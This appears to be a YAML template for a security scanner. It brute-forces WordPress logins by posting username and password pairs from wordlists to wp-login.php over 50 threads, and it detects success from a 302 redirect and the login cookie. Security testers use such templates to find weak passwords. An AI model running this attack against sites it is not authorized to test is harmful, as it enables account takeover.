info:
  id: wp-weak-credentials
  name: WordPress Weak Credentials
  author: Hung, Dat, Danh, Hoa
  severity: critical
  tags: wordpress,default-login,fuzz

requests:
  - request:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}

        log={{users}}&pwd={{passwords}}

    payloads:
      users: ../Wordlists/users.txt
      passwords: ../Wordlists/passwords.txt
    thread: 50
    scanMode: clusterbomb
    firstMatchStop: true
    multipleMatcher: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        word:
          - '/wp-admin'
          - 'wordpress_logged_in'
        condition: and
        part: header